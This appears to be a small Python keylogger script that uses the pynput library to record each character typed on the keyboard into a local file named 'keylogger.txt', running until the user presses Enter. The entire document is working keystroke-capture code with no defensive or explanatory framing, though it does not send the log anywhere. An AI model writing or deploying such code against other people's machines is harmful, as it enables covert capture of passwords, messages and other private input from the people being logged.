
from pynput import keyboard


def keypressed(key):
    with open("keylogger.txt", "a") as log:
        try:
            char = key.char
            log.write(char)
        except:
            print("Error getting char")


listner = keyboard.Listener(on_press=keypressed)
listner.start()
input()
